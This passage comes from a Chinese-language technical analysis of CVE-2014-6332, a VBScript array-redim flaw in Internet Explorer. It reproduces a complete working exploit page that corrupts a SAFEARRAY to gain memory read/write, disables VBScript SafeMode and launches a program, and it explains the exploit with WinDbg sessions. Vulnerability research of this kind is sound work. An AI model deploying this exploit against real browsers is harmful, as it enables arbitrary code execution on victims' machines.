<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">bd</span> <span class="o">*</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">6</span><span class="n">efe0000</span> <span class="mi">6</span><span class="n">efe3000</span>   <span class="n">C</span><span class="o">:\</span><span class="n">Windows</span><span class="o">\</span><span class="n">system32</span><span class="o">\</span><span class="n">sfc</span><span class="o">.</span><span class="na">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">6</span><span class="n">efd0000</span> <span class="mi">6</span><span class="n">efdd000</span>   <span class="n">C</span><span class="o">:\</span><span class="n">Windows</span><span class="o">\</span><span class="n">system32</span><span class="o">\</span><span class="n">sfc_os</span><span class="o">.</span><span class="na">DLL</span>
</pre></div>


<p>可以看到，SafeMode标志是vbscript!COleScript对象指针特定偏移处的一个值，在InSafeMode函数中，会检查它和0x0B相与的结果，如果为0，那么VBScript的执行将不再受到限制，即此时SafeMode标志值要为0或4，通过手动修改内存中的这个标志值最终可以弹出记事本。</p>
<h3>0x04 漏洞利用</h3>
<p>在前面分析的基础上，我们来看一下此漏洞的<a href="https://www.exploit-db.com/exploits/35229/">exploit</a>，具体思路就是通过corrupt后的SAFEARRAY结构来获取RW primitives，然后对SafeMode标志进行修改，从而执行任意的VBScript代码：</p>
<div class="codehilite"><pre><span></span><span class="o">&lt;!</span><span class="nx">DOCTYPE</span> <span class="nx">html</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="s2">&quot;X-UA-Compatible&quot;</span> <span class="nx">content</span><span class="o">=</span><span class="s2">&quot;IE=EmulateIE8&quot;</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
  <span class="nx">CVE</span><span class="o">-</span><span class="mi">2014</span><span class="o">-</span><span class="mi">6332</span> <span class="nx">exploit</span> <span class="nx">by</span> <span class="nx">yuange</span><span class="p">.</span>
<span class="o">&lt;</span><span class="nx">SCRIPT</span> <span class="nx">LANGUAGE</span><span class="o">=</span><span class="s2">&quot;VBScript&quot;</span><span class="o">&gt;</span>
<span class="kd">function</span> <span class="nx">Runmumaa</span><span class="p">()</span>  <span class="s1">&#39;弹出记事本&#39;</span>
  <span class="nx">On</span> <span class="nb">Error</span> <span class="nx">Resume</span> <span class="nx">Next</span>
  <span class="nx">set</span> <span class="nx">shell</span><span class="o">=</span><span class="nx">createobject</span><span class="p">(</span><span class="s2">&quot;Shell.Application&quot;</span><span class="p">)</span>
  <span class="nx">shell</span><span class="p">.</span><span class="nx">ShellExecute</span> <span class="s2">&quot;notepad.exe&quot;</span>
<span class="nx">end</span> <span class="kd">function</span>
<span class="o">&lt;</span><span class="err">/script&gt;</span>

<span class="o">&lt;</span><span class="nx">SCRIPT</span> <span class="nx">LANGUAGE</span><span class="o">=</span><span class="s2">&quot;VBScript&quot;</span><span class="o">&gt;</span>
<span class="nx">dim</span> <span class="nx">aa</span><span class="p">()</span>  <span class="s1">&#39;数组和变量的定义&#39;</span>
<span class="nx">dim</span> <span class="nx">ab</span><span class="p">()</span>
<span class="nx">dim</span> <span class="nx">a0</span>
<span class="nx">dim</span> <span class="nx">a1</span>
<span class="nx">dim</span> <span class="nx">a2</span>
<span class="nx">dim</span> <span class="nx">a3</span>
<span class="nx">dim</span> <span class="nx">intVersion</span>
<span class="nx">dim</span> <span class="nx">myarray</span>

<span class="nx">Begin</span><span class="p">()</span>

<span class="kd">function</span> <span class="nx">Begin</span><span class="p">()</span>  <span class="s1">&#39;程序入口&#39;</span>
  <span class="nx">On</span> <span class="nb">Error</span> <span class="nx">Resume</span> <span class="nx">Next</span>
  <span class="nx">info</span><span class="o">=</span><span class="nx">Navigator</span><span class="p">.</span><span class="nx">UserAgent</span>

  <span class="k">if</span> <span class="p">(</span><span class="nx">instr</span><span class="p">(</span><span class="nx">info</span><span class="p">,</span><span class="s2">&quot;Win64&quot;</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="nx">then</span>  <span class="s1">&#39;判断系统位数并获取IE版本&#39;</span>
    <span class="nx">exit</span> <span class="kd">function</span>
  <span class="nx">end</span> <span class="k">if</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">instr</span><span class="p">(</span><span class="nx">info</span><span class="p">,</span><span class="s2">&quot;MSIE&quot;</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="nx">then</span>
    <span class="nx">intVersion</span> <span class="o">=</span> <span class="nx">CInt</span><span class="p">(</span><span class="nx">Mid</span><span class="p">(</span><span class="nx">info</span><span class="p">,</span> <span class="nx">InStr</span><span class="p">(</span><span class="nx">info</span><span class="p">,</span> <span class="s2">&quot;MSIE&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
  <span class="k">else</span>
    <span class="nx">exit</span> <span class="kd">function</span>
  <span class="nx">end</span> <span class="k">if</span>

  <span class="nx">BeginInit</span><span class="p">()</span>
  <span class="k">if</span> <span class="nx">Create</span><span class="p">()</span><span class="o">=</span><span class="nx">True</span> <span class="nx">then</span>
    <span class="nx">myarray</span><span class="o">=</span><span class="nx">chrw</span><span class="p">(</span><span class="mi">01</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">chrw</span><span class="p">(</span><span class="mi">2176</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">chrw</span><span class="p">(</span><span class="mi">01</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">chrw</span><span class="p">(</span><span class="mi">00</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">chrw</span><span class="p">(</span><span class="mi">00</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">chrw</span><span class="p">(</span><span class="mi">00</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">chrw</span><span class="p">(</span><span class="mi">00</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">chrw</span><span class="p">(</span><span class="mi">00</span><span class="p">)</span>
    <span class="nx">myarray</span><span class="o">=</span><span class="nx">myarray</span><span class="o">&amp;</span><span class="nx">chrw</span><span class="p">(</span><span class="mi">00</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">chrw</span><span class="p">(</span><span class="mi">32767</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">chrw</span><span class="p">(</span><span class="mi">00</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">chrw</span><span class="p">(</span><span class="mi">00</span><span class="p">)</span>  <span class="s1">&#39;定义精心构造的SAFEARRAY结构&#39;</span>
    <span class="nx">Setnotsafemode</span><span class="p">()</span>
  <span class="nx">end</span> <span class="k">if</span>
<span class="nx">end</span> <span class="kd">function</span>

<span class="kd">function</span> <span class="nx">BeginInit</span><span class="p">()</span>  <span class="s1">&#39;数组和变量的初始化&#39;</span>
  <span class="nx">Randomize</span><span class="p">()</span>
  <span class="nx">redim</span> <span class="nx">aa</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
  <span class="nx">redim</span> <span class="nx">ab</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
  <span class="nx">a0</span><span class="o">=</span><span class="mi">13</span><span class="o">+</span><span class="mi">17</span><span class="o">*</span><span class="nx">rnd</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
  <span class="nx">a3</span><span class="o">=</span><span class="mi">7</span><span class="o">+</span><span class="mi">3</span><span class="o">*</span><span class="nx">rnd</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="nx">end</span> <span class="kd">function</span>

<span class="kd">function</span> <span class="nx">Create</span><span class="p">()</span>  <span class="s1">&#39;创建期望的内存布局&#39;</span>
  <span class="nx">On</span> <span class="nb">Error</span> <span class="nx">Resume</span> <span class="nx">Next</span>
  <span class="nx">dim</span> <span class="nx">i</span>
  <span class="nx">Create</span><span class="o">=</span><span class="nx">False</span>
  <span class="k">for</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span> <span class="nx">to</span> <span class="mi">400</span>
    <span class="k">if</span> <span class="nx">Over</span><span class="p">()</span><span class="o">=</span><span class="nx">True</span> <span class="nx">then</span>
      <span class="nx">Create</span><span class="o">=</span><span class="nx">True</span>
      <span class="nx">exit</span> <span class="k">for</span>
    <span class="nx">end</span> <span class="k">if</span>
  <span class="nx">next</span>
<span class="nx">end</span> <span class="kd">function</span>

<span class="nx">sub</span> <span class="nx">testaa</span><span class="p">()</span>
<span class="nx">end</span> <span class="nx">sub</span>

<span class="kd">function</span> <span class="nx">Mydata</span><span class="p">()</span>  <span class="s1">&#39;获取函数对象指针并布局精心构造的SAFEARRAY结构&#39;</span>
  <span class="nx">On</span> <span class="nb">Error</span> <span class="nx">Resume</span> <span class="nx">Next</span>
  <span class="nx">i</span><span class="o">=</span><span class="nx">testaa</span>
  <span class="nx">i</span><span class="o">=</span><span class="kc">null</span>

  <span class="nx">redim</span> <span class="nx">Preserve</span> <span class="nx">aa</span><span class="p">(</span><span class="nx">a2</span><span class="p">)</span>
  <span class="nx">ab</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">=</span><span class="mi">0</span>
  <span class="nx">aa</span><span class="p">(</span><span class="nx">a1</span><span class="p">)</span><span class="o">=</span><span class="nx">i</span>
  <span class="nx">ab</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">=</span><span class="mf">6.36598737437801E-314</span>  <span class="s1">&#39;0x0000000300000003&#39;</span>
  <span class="nx">aa</span><span class="p">(</span><span class="nx">a1</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">=</span><span class="nx">myarray</span>
  <span class="nx">ab</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">=</span><span class="mf">1.74088534731324E-310</span>  <span class="s1">&#39;0x0000200c0000200c&#39;</span>
  <span class="nx">Mydata</span><span class="o">=</span><span class="nx">aa</span><span class="p">(</span><span class="nx">a1</span><span class="p">)</span>
  <span class="nx">redim</span> <span class="nx">Preserve</span> <span class="nx">aa</span><span class="p">(</span><span class="nx">a0</span><span class="p">)</span>
<span class="nx">end</span> <span class="kd">function</span>

<span class="kd">function</span> <span class="nx">Setnotsafemode</span><span class="p">()</span>
  <span class="nx">On</span> <span class="nb">Error</span> <span class="nx">Resume</span> <span class="nx">Next</span>
  <span class="nx">i</span><span class="o">=</span><span class="nx">Mydata</span><span class="p">()</span>  <span class="s1">&#39;获取testaa函数对象指针，即CScriptEntryPoint对象指针&#39;</span>
  <span class="nx">i</span><span class="o">=</span><span class="nx">ReadMemo</span><span class="p">(</span><span class="nx">i</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
  <span class="nx">i</span><span class="o">=</span><span class="nx">ReadMemo</span><span class="p">(</span><span class="nx">i</span><span class="o">+</span><span class="mi">16</span><span class="p">)</span>  <span class="s1">&#39;获取COleScript对象指针&#39;</span>

  <span class="k">for</span> <span class="nx">k</span><span class="o">=</span><span class="mi">0</span> <span class="nx">to</span> <span class="o">&amp;</span><span class="nx">h60</span> <span class="nx">step</span> <span class="mi">4</span>  <span class="s1">&#39;搜索内存中的SafeMode标志值并修改&#39;</span>
    <span class="nx">j</span><span class="o">=</span><span class="nx">ReadMemo</span><span class="p">(</span><span class="nx">i</span><span class="o">+&amp;</span><span class="nx">h120</span><span class="o">+</span><span class="nx">k</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">j</span><span class="o">=</span><span class="mi">14</span><span class="p">)</span> <span class="nx">then</span>
      <span class="nx">redim</span> <span class="nx">Preserve</span> <span class="nx">aa</span><span class="p">(</span><span class="nx">a2</span><span class="p">)</span>
      <span class="nx">aa</span><span class="p">(</span><span class="nx">a1</span><span class="o">+</span><span class="mi">2</span><span class="p">)(</span><span class="nx">i</span><span class="o">+&amp;</span><span class="nx">h11c</span><span class="o">+</span><span class="nx">k</span><span class="p">)</span><span class="o">=</span><span class="nx">ab</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>  <span class="s1">&#39;write primitive&#39;</span>
      <span class="nx">redim</span> <span class="nx">Preserve</span> <span class="nx">aa</span><span class="p">(</span><span class="nx">a0</span><span class="p">)</span>
      <span class="nx">exit</span> <span class="k">for</span>
    <span class="nx">end</span> <span class="k">if</span>
  <span class="nx">next</span>

  <span class="nx">ab</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">=</span><span class="mf">1.69759663316747E-313</span>  <span class="s1">&#39;0x0000000800000008&#39;</span>
  <span class="nx">Runmumaa</span><span class="p">()</span>
<span class="nx">end</span> <span class="kd">function</span>

<span class="kd">function</span> <span class="nx">Over</span><span class="p">()</span>  <span class="s1">&#39;判断内存中分配的aa、ab这两个数组是否相邻&#39;</span>
  <span class="nx">On</span> <span class="nb">Error</span> <span class="nx">Resume</span> <span class="nx">Next</span>
  <span class="nx">dim</span> <span class="nx">type1</span>
  <span class="nx">Over</span><span class="o">=</span><span class="nx">False</span>
  <span class="nx">a0</span><span class="o">=</span><span class="nx">a0</span><span class="o">+</span><span class="nx">a3</span>
  <span class="nx">a1</span><span class="o">=</span><span class="nx">a0</span><span class="o">+</span><span class="mi">2</span>
  <span class="nx">a2</span><span class="o">=</span><span class="nx">a0</span><span class="o">+&amp;</span><span class="nx">h8000000</span>
  <span class="nx">redim</span> <span class="nx">Preserve</span> <span class="nx">aa</span><span class="p">(</span><span class="nx">a0</span><span class="p">)</span>
  <span class="nx">redim</span> <span class="nx">ab</span><span class="p">(</span><span class="nx">a0</span><span class="p">)</span>

  <span class="nx">redim</span> <span class="nx">Preserve</span> <span class="nx">aa</span><span class="p">(</span><span class="nx">a2</span><span class="p">)</span>  <span class="s1">&#39;对aa数组进行corrupt&#39;</span>
  <span class="nx">type1</span><span class="o">=</span><span class="mi">1</span>
  <span class="nx">ab</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">=</span><span class="mf">1.012345678901234567890123456789</span>  <span class="s1">&#39;用作标记值&#39;</span>
  <span class="nx">aa</span><span class="p">(</span><span class="nx">a0</span><span class="p">)</span><span class="o">=</span><span class="mi">10</span>

  <span class="k">if</span> <span class="p">(</span><span class="nx">IsObject</span><span class="p">(</span><span class="nx">aa</span><span class="p">(</span><span class="nx">a1</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="o">=</span> <span class="nx">False</span><span class="p">)</span> <span class="nx">then</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">VarType</span><span class="p">(</span><span class="nx">aa</span><span class="p">(</span><span class="nx">a1</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span><span class="o">&lt;&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="nx">then</span>
      <span class="k">if</span> <span class="p">(</span><span class="nx">IsObject</span><span class="p">(</span><span class="nx">aa</span><span class="p">(</span><span class="nx">a1</span><span class="p">))</span> <span class="o">=</span> <span class="nx">False</span><span class="p">)</span> <span class="nx">then</span>
        <span class="nx">type1</span><span class="o">=</span><span class="nx">VarType</span><span class="p">(</span><span class="nx">aa</span><span class="p">(</span><span class="nx">a1</span><span class="p">))</span>
      <span class="nx">end</span> <span class="k">if</span>
    <span class="nx">end</span> <span class="k">if</span>
  <span class="nx">end</span> <span class="k">if</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">type1</span><span class="o">=&amp;</span><span class="nx">h0b24</span><span class="p">)</span> <span class="nx">then</span>  <span class="s1">&#39;判断是否和标记相符&#39;</span>
    <span class="nx">Over</span><span class="o">=</span><span class="nx">True</span>
  <span class="nx">end</span> <span class="k">if</span>
  <span class="nx">redim</span> <span class="nx">Preserve</span> <span class="nx">aa</span><span class="p">(</span><span class="nx">a0</span><span class="p">)</span>  <span class="s1">&#39;恢复aa数组至corrupt前&#39;</span>
<span class="nx">end</span> <span class="kd">function</span>

<span class="kd">function</span> <span class="nx">ReadMemo</span><span class="p">(</span><span class="nx">add</span><span class="p">)</span>  <span class="s1">&#39;借助类型混淆来读取add地址处的值&#39;</span>
  <span class="nx">On</span> <span class="nb">Error</span> <span class="nx">Resume</span> <span class="nx">Next</span>
  <span class="nx">redim</span> <span class="nx">Preserve</span> <span class="nx">aa</span><span class="p">(</span><span class="nx">a2</span><span class="p">)</span>
  <span class="nx">ab</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">=</span><span class="mi">0</span>
  <span class="nx">aa</span><span class="p">(</span><span class="nx">a1</span><span class="p">)</span><span class="o">=</span><span class="nx">add</span><span class="o">+</span><span class="mi">4</span>
  <span class="nx">ab</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">=</span><span class="mf">1.69759663316747E-313</span>  <span class="s1">&#39;0x0000000800000008&#39;</span>
  <span class="nx">ReadMemo</span><span class="o">=</span><span class="nx">lenb</span><span class="p">(</span><span class="nx">aa</span><span class="p">(</span><span class="nx">a1</span><span class="p">))</span>  <span class="s1">&#39;read primitive&#39;</span>
  <span class="nx">ab</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">=</span><span class="mi">0</span>
  <span class="nx">redim</span> <span class="nx">Preserve</span> <span class="nx">aa</span><span class="p">(</span><span class="nx">a0</span><span class="p">)</span>
<span class="nx">end</span> <span class="kd">function</span>
<span class="o">&lt;</span><span class="err">/script&gt;</span>
<span class="o">&lt;</span><span class="err">/body&gt;</span>
<span class="o">&lt;</span><span class="err">/html&gt;</span>
</pre></div>


<p>其中，科学记数法表示的浮点数可由C中的printf函数进行转换：</p>
<p>``` code c
printf("%I64x\n", 1.69759663316747E-313);
printf("%.14E\n", 0x0000000800000008);</p>
<div class="codehilite"><pre><span></span>在调试过程中我们可适当插入document.write()来输出那些辅助的信息，同时还可以通过插入MsgBox()来定位相关代码，例如最开始先禁用WinDbg中的所有断点，待弹出窗口后再启用断点，这样我们就能快速跳到想要的位置跟踪调试了。

此外，[yuange](https://twitter.com/yuange75)的DVE（数据虚拟执行）想法确实妙，笔者还有待慢慢领悟，下面我们进入详细的分析。

####1 内存布局

exploit中用到了aa和ab两个数组，它们会在Over()中通过redim进行重新分配，也就是执行完如下两条语句后：

``` code html
redim Preserve aa(a0)
redim ab(a0)
</pre></div>


<p>内存布局需要达到如下效果，同样，每个数组元素都保存在Variant结构中：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/03/2.png-w331s" />
<center><small>图2&nbsp;&nbsp;期望的内存布局</small></center></p>
<p>如果不满足就重复这个分配过程，由于相应空间分配在堆上，根据堆管理的性质是能实现上述布局的，这样就可以通过corrupt后的aa数组来越界访问ab数组了。我们来具体看一下：</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">012</span><span class="o">&gt;</span> <span class="n">bp</span> <span class="n">OLEAUT32</span><span class="o">!</span><span class="n">SafeArrayRedim</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">012</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">0</span> <span class="n">hit</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb14</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">004692</span><span class="n">e8</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000060</span> <span class="n">esi</span><span class="o">=</span><span class="mi">01</span><span class="n">df84d0</span> <span class="n">edi</span><span class="o">=</span><span class="mi">01</span><span class="n">e00900</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">7664</span><span class="n">ec2c</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb00</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0249</span><span class="n">cb1c</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">OLEAUT32</span><span class="o">!</span><span class="n">SafeArrayRedim</span><span class="o">:</span>
<span class="mi">7664</span><span class="n">ec2c</span> <span class="mi">8</span><span class="n">bff</span>            <span class="n">mov</span>     <span class="n">edi</span><span class="o">,</span><span class="n">edi</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">kb</span> <span class="mi">3</span>
<span class="n">ChildEBP</span> <span class="n">RetAddr</span>  <span class="n">Args</span> <span class="n">to</span> <span class="n">Child</span>              
<span class="mi">0249</span><span class="n">cafc</span> <span class="mi">6</span><span class="n">fb158da</span> <span class="mi">004692</span><span class="n">e8</span> <span class="mi">0249</span><span class="n">cb14</span> <span class="n">ffffffff</span> <span class="n">OLEAUT32</span><span class="o">!</span><span class="n">SafeArrayRedim</span>
<span class="mi">0249</span><span class="n">cb1c</span> <span class="mi">6</span><span class="n">fb15887</span> <span class="mi">00000001</span> <span class="mi">00000001</span> <span class="mi">01</span><span class="n">df84d0</span> <span class="n">vbscript</span><span class="o">!</span><span class="n">RedimPreserveArray</span><span class="o">+</span><span class="mh">0x81</span>
<span class="mi">0249</span><span class="n">cc18</span> <span class="mi">6</span><span class="n">fb04ff6</span> <span class="mi">0249</span><span class="n">ce2c</span> <span class="n">c9d653d5</span> <span class="mi">01</span><span class="n">e008d0</span> <span class="n">vbscript</span><span class="o">!</span><span class="n">CScriptRuntime</span><span class="o">::</span><span class="n">RunNoEH</span><span class="o">+</span><span class="mh">0x1466</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">004692</span><span class="n">e8</span> <span class="n">L6</span>
<span class="mi">004692</span><span class="n">e8</span>  <span class="mi">08800001</span> <span class="mi">00000010</span> <span class="mi">00000000</span> <span class="mi">0042</span><span class="n">e2b8</span>
<span class="mi">004692</span><span class="n">f8</span>  <span class="mi">00000006</span> <span class="mi">00000000</span>
<span class="o">......</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="o">(</span><span class="mi">6</span><span class="n">b0</span><span class="o">.</span><span class="na">f28</span><span class="o">):</span> <span class="n">Break</span> <span class="n">instruction</span> <span class="n">exception</span> <span class="o">-</span> <span class="n">code</span> <span class="mi">80000003</span> <span class="o">(</span><span class="n">first</span> <span class="n">chance</span><span class="o">)</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">7</span><span class="n">ffd4000</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">edx</span><span class="o">=</span><span class="mi">77</span><span class="n">b8f125</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000000</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">77</span><span class="n">b240f0</span> <span class="n">esp</span><span class="o">=</span><span class="mi">059</span><span class="n">dfd94</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">059</span><span class="n">dfdc0</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">ntdll</span><span class="o">!</span><span class="n">DbgBreakPoint</span><span class="o">:</span>
<span class="mi">77</span><span class="n">b240f0</span> <span class="n">cc</span>              <span class="n">int</span>     <span class="mi">3</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">010</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">004692</span><span class="n">e8</span> <span class="n">L6</span>
<span class="mi">004692</span><span class="n">e8</span>  <span class="mi">08800001</span> <span class="mi">00000010</span> <span class="mi">00000000</span> <span class="mi">02</span><span class="n">e66ec8</span>
<span class="mi">004692</span><span class="n">f8</span>  <span class="mi">080000</span><span class="n">a2</span> <span class="mi">00000000</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">010</span><span class="o">&gt;</span> <span class="o">!</span><span class="n">heap</span> <span class="o">-</span><span class="n">p</span> <span class="o">-</span><span class="n">a</span> <span class="mi">02</span><span class="n">e66ec8</span>
    <span class="n">address</span> <span class="mi">02</span><span class="n">e66ec8</span> <span class="n">found</span> <span class="k">in</span>
    <span class="n">_HEAP</span> <span class="err">@</span> <span class="mi">3</span><span class="n">c0000</span>
      <span class="n">HEAP_ENTRY</span> <span class="n">Size</span> <span class="n">Prev</span> <span class="n">Flags</span>    <span class="n">UserPtr</span> <span class="n">UserSize</span> <span class="o">-</span> <span class="n">state</span>
        <span class="mi">02</span><span class="n">e66ec0</span> <span class="mi">0145</span> <span class="mi">0000</span>  <span class="o">[</span><span class="mi">00</span><span class="o">]</span>   <span class="mi">02</span><span class="n">e66ec8</span>    <span class="mi">00</span><span class="n">a20</span> <span class="o">-</span> <span class="o">(</span><span class="n">busy</span><span class="o">)</span>


<span class="mi">0</span><span class="o">:</span><span class="mi">010</span><span class="o">&gt;</span> <span class="o">?</span> <span class="mi">02</span><span class="n">e66ec8</span><span class="o">+</span><span class="n">a2</span><span class="o">*</span><span class="mi">10</span>
<span class="n">Evaluate</span> <span class="n">expression</span><span class="o">:</span> <span class="mi">48658664</span> <span class="o">=</span> <span class="mi">02</span><span class="n">e678e8</span>
</pre></div>


<p>此时地址0x02e678e8处即为8字节的堆指针，内存分布如下：</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/03/3.png-w331s" />
<center><small>图3&nbsp;&nbsp;满足条件的内存分布</small></center></p>
<p>其中，数值1.012345678901234567890123456789保存在ab(0)中，该Variant结构的Type字段为5，而Data High＋Data Low字段为0x3ff0329161f20b24。当aa数组corrupt后可以访问到ab数组中的数据，由于这之间恰好隔了8字节的堆指针，所以这两个数组的Type＋Reserved部分就和Data High＋Data Low部分交错了，因此ab(0)的Data High＋Data Low部分会被当成aa(a1)的Type＋Reserved部分，即VarType(aa(a1))等于0x0b24。</p>
<h4>2 类型混淆</h4>
<p>在完成内存的布局后，exploit就可以借助ab数组元素的赋值操作来对corrupt后aa数组元素的Type字段进行更改，从而实现类型的混淆，接下去我们将分析exploit中用到的类型混淆手法以及由此得到的Read primitive。</p>
<p>来看下Mydata()函数，它会通过如下代码将testaa函数对象指针赋给i：</p>
<p>``` code html
On Error Resume Next
i=testaa
i=null</p>
<div class="codehilite"><pre><span></span>接着是与类型混淆有关的那部分代码：

``` code html
redim Preserve aa(a2)  &#39;对aa数组进行corrupt&#39;
ab(0)=0
aa(a1)=i
ab(0)=6.36598737437801E-314  &#39;0x0000000300000003&#39;
aa(a1+2)=myarray
ab(2)=1.74088534731324E-310  &#39;0x0000200c0000200c&#39;
Mydata=aa(a1)
redim Preserve aa(a0)  &#39;恢复aa数组至corrupt前&#39;
</pre></div>


<p>这里面会进行两次类型混淆处理，首先由于变量i的类型为null(0x01)，因此需要将其转成long integer(0x03)后再返回，该函数对象指针事实上就是CScriptEntryPoint对象的指针。而myarray中则保存着精心构造的SAFEARRAY结构，最初赋给aa(a1+2)时其类型为string(0x08)，需要将其类型改为Variant数组，这在后面获取Write primitive时会用到。对应的调试过程如下：</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">bl</span>
 <span class="mi">0</span> <span class="n">e</span> <span class="mi">7664</span><span class="n">ec2c</span>     <span class="mi">0001</span> <span class="o">(</span><span class="mi">0001</span><span class="o">)</span>  <span class="mi">0</span><span class="o">:****</span> <span class="n">OLEAUT32</span><span class="o">!</span><span class="n">SafeArrayRedim</span>
 <span class="mi">1</span> <span class="n">e</span> <span class="mi">6</span><span class="n">fb02e64</span>     <span class="mi">0001</span> <span class="o">(</span><span class="mi">0001</span><span class="o">)</span>  <span class="mi">0</span><span class="o">:****</span> <span class="n">vbscript</span><span class="o">!</span><span class="n">AssignVar</span>
 <span class="mi">2</span> <span class="n">e</span> <span class="mi">6</span><span class="n">fb11f4c</span>     <span class="mi">0001</span> <span class="o">(</span><span class="mi">0001</span><span class="o">)</span>  <span class="mi">0</span><span class="o">:****</span> <span class="n">vbscript</span><span class="o">!</span><span class="n">AccessArray</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">hit</span>
